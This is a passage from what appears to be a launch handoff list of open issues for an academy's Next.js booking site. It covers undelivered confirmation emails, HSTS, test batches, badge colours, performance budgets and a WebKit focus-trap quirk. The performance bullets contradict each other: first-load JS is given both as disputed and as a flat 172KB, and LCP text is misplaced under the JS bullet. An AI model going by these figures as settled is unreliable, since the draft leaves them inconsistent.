  academy is emailed — so the only party left uninformed is the person who paid. Since 7 September
  every server boot logs
  `{"at":"boot","event":"half-configured-integration","pairs":["resend: STUDENT CONFIRMATION EMAILS ARE NOT BEING DELIVERED..."]}`
  and every refused send logs `{"event":"notify-failed","task":"booking-confirmation",...}` with
  Resend's own message. Both are `console.error`, so they show as errors in the Vercel log.
- **Two moderate dependency advisories** remain, both inside the Sanity CLI's tree, reaching nothing
  the site ships. `pnpm audit --audit-level high` is clean, which is what CI gates on.
- **HSTS is written but commented out** in `src/middleware.ts`. It must not be enabled until the
  real domain is serving HTTPS: a wrong HSTS header is cached by every browser that saw it for the
  whole max-age and cannot be withdrawn. Note that the review alias *does* answer
  `strict-transport-security: max-age=63072000` — that is Vercel's own header on every
  `*.vercel.app` hostname, not this code, and it will not follow the site onto the academy's
  domain. Whoever launches still has to uncomment the block.
- **The ₹1 test batches are still in the dataset.** Labelled "TEST BATCH, do not book" and harmless
  on test keys. `pnpm sanity:seed:test-batch -- --delete` before switching to live keys, because on
  live keys a mis-click really does charge a rupee.

- **The logo raster's red samples as `#AA1916`, not the `#B20003` token.** Visible where the mark
  sits beside a red button. This is the supplied artwork, and design.md forbids recolouring it, so
  nothing is done in code. The SVG (client item 18) resolves it.
- **Badge colours no longer identify a level uniquely.** `levelBadge` in `content/data.ts` gives
  mustard to both Foundation and IBC Junior, and blue to both Intermediate and IBC Advanced. The
  ladder's group headings carry the distinction. Worth a client decision if the badges are meant
  to be read on their own.
- **LCP misses the 2.5s budget on three of the four measured routes, and the fourth is not settled
  either.** `/courses`, a course page and `/enquire` sit at 3.1s to 3.4s across repeat runs,
  on localhost and on the deployment alike, so it is not an artefact of serving from a dev machine.
  The homepage was recorded at 2.1s and now re-measures at 3.4s. **That is not a regression from
  the design work**: the commit immediately before it (`d553540`) was checked out, rebuilt and
  measured, and it scores the same. Home simply sits near the boundary where Lighthouse's simulated
  throttling flips its LCP element between the Bebas H1 and the Montserrat sub-line, which are
  within about 10% of each other in area at a 412px viewport. Read it as 92 to 99, LCP 2.1 to 3.4s.
  Reasoning and the A/B in `docs/audits/perf-draft.md`.
- **First-load JS has two disagreeing measurements.** 172KB gz is what was recorded from Next's own
  figure. Summing the 14 unique chunk `<script>` tags on `/` over the wire gives about 248KB gz,
  and Lighthouse independently reports 220KB of script transfer. Next 16's Turbopack build prints
  no size table and writes no `app-build-manifest.json`, so the original basis could not be
  reproduced to compare like for like. Either way it is over the 150KB budget; how far over is an
  open question for whoever next has a reproducible number.
  Measured directly in a throttled browser rather than through Lighthouse's simulation, the LCP
  element on each route is real above-the-fold text painting in about 750ms. What it is: a text
  LCP waiting on a font and a stylesheet on a simulated slow-4G connection. The best lever is the
  client's photography, which will change the LCP element on most pages from text to an image that
  can be preloaded and served as AVIF. Full reasoning in `docs/audits/perf-draft.md`.
- **First-load JS is 172KB gz against the 150KB budget.** About 150KB of that is the React 19 and
  Next 16 App Router baseline. The application's own code is roughly 22KB over. The only remaining
  lever is dropping Base UI's sheet for a CSS-only mobile nav, saving about 16KB at the cost of the
  focus trap, Escape handling and focus restore, which is not a trade worth making.
- **The mobile sheet's focus trap leaks on WebKit under Playwright.** Tabbing while the sheet is
  open reaches page controls behind it in the webkit and iPhone 14 projects, but not in Chromium.
  The sheet is the shadcn/Base UI primitive and must not be hand-edited. This may be an artefact of
  synthetic key events rather than real Safari behaviour, so the strict trap assertion runs on the
  Chromium projects and the Escape and focus-restore assertions run everywhere. **Check this by
  hand on a real iPhone before launch.**
- **Controlled form fields discard anything typed before React hydrates.** Not reachable by a human
  typing at normal speed, but it is real. Both forms now set `data-hydrated="true"` when they
  become interactive, which is what the tests wait for.
- **Context7 MCP is unavailable.** `CONTEXT7_API_KEY` is empty in `.env.local`, so every
  `create-next-app`, shadcn, Tailwind and Next API used here was verified against each tool's own
  `--help` output and its installed package instead. If a newer API exists, this is where it would
  have been caught.
